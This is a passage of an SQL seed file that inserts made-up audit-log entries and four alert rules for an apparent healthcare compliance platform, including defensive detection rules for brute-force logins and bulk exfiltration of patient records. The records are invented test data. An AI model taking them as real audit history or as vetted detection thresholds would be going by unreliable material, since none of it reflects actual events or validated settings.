  ('log-phs-003', 'org-phs-001', 'user-phs-005', 'poam_created', 'poam', 'poam-phs-001', NULL, '{"poam_id": "POAM-PHS-2026-001", "risk_level": "critical"}', '10.100.0.50', 'Mozilla/5.0', '2026-02-18 08:00:00'),
  ('log-phs-004', 'org-phs-001', 'user-phs-005', 'poam_created', 'poam', 'poam-phs-002', NULL, '{"poam_id": "POAM-PHS-2026-002", "risk_level": "critical"}', '10.100.0.50', 'Mozilla/5.0', '2026-02-18 08:30:00'),
  ('log-phs-005', 'org-phs-001', 'user-phs-005', 'finding_updated', 'vulnerability_finding', 'find-phs-001', '{"status": "open"}', '{"status": "in_progress"}', '10.100.0.50', 'Mozilla/5.0', '2026-02-18 09:00:00'),
  ('log-phs-006', 'org-phs-001', 'user-phs-003', 'ssp_updated', 'ssp_document', 'ssp-phs-001', '{"status": "draft"}', '{"status": "review"}', '10.20.5.122', 'Mozilla/5.0', '2026-02-15 14:00:00'),
  ('log-phs-007', 'org-phs-001', 'user-phs-002', 'incident_created', 'security_incident', 'inc-phs-002', NULL, '{"incident_number": "INC-PHS-2026-002", "severity": "high"}', '10.20.5.88', 'Mozilla/5.0', '2026-02-18 17:00:00'),
  ('log-phs-008', 'org-phs-001', 'user-phs-001', 'login_success', 'session', NULL, NULL, '{"mfa": true, "ip": "10.20.5.100"}', '10.20.5.100', 'Mozilla/5.0', '2026-02-19 08:00:00'),
  ('log-phs-009', 'org-phs-001', 'user-phs-004', 'control_assessed', 'control_implementation', 'ci-phs-012', '{"assessment_status": "not_assessed"}', '{"assessment_status": "other_than_satisfied"}', '10.20.5.95', 'Mozilla/5.0', '2026-02-08 11:00:00'),
  ('log-phs-010', 'org-phs-001', 'user-phs-005', 'finding_remediated', 'vulnerability_finding', 'find-phs-010', '{"status": "open"}', '{"status": "remediated"}', '10.100.0.50', 'Mozilla/5.0', '2026-02-18 14:00:00');

-- ========================================
-- 15. ALERT RULES (4 configured rules)
-- ========================================
INSERT OR IGNORE INTO alert_rules (id, organization_id, name, description, rule_type, conditions, severity, mitre_tactics, mitre_techniques, compliance_controls, notification_channels, is_enabled, created_by, created_at, updated_at)
VALUES
  ('rule-phs-001', 'org-phs-001', 'Brute Force Detection', 'Alert on 10+ failed login attempts from single IP within 5 minutes', 'threshold', '{"metric": "failed_logins", "threshold": 10, "window_seconds": 300, "group_by": "source_ip"}', 'high', '["TA0001"]', '["T1110"]', '["AC-7", "SI-4"]', '["in_app", "email", "slack"]', 1, 'user-phs-005', '2026-01-20 09:00:00', '2026-01-20 09:00:00'),
  ('rule-phs-002', 'org-phs-001', 'Bulk PHI Export Detection', 'Alert when user exports more than 500 patient records in single query', 'threshold', '{"metric": "phi_records_exported", "threshold": 500, "window_seconds": 60, "group_by": "user_id"}', 'high', '["TA0010"]', '["T1567"]', '["AC-3", "AU-12", "SC-28"]', '["in_app", "email"]', 1, 'user-phs-002', '2026-01-22 14:00:00', '2026-01-22 14:00:00'),
  ('rule-phs-003', 'org-phs-001', 'After-Hours PHI Access', 'Alert on PHI access outside 06:00-22:00 local time for non-emergency users', 'anomaly', '{"metric": "phi_access", "time_restriction": {"start": "06:00", "end": "22:00", "timezone": "America/New_York"}, "exclude_roles": ["emergency_provider"]}', 'medium', '["TA0009"]', '["T1530"]', '["AC-2", "AC-3", "AU-6"]', '["in_app"]', 1, 'user-phs-002', '2026-01-25 10:00:00', '2026-01-25 10:00:00'),
  ('rule-phs-004', 'org-phs-001', 'Critical Vulnerability Auto-POA&M', 'Automatically create POA&M for any critical or high vulnerability finding', 'signature', '{"event_type": "new_vulnerability", "severity": ["critical", "high"], "auto_action": "create_poam"}', 'critical', '[]', '[]', '["RA-5", "SI-2"]', '["in_app", "email", "slack"]', 1, 'user-phs-005', '2026-01-20 09:00:00', '2026-01-20 09:00:00');
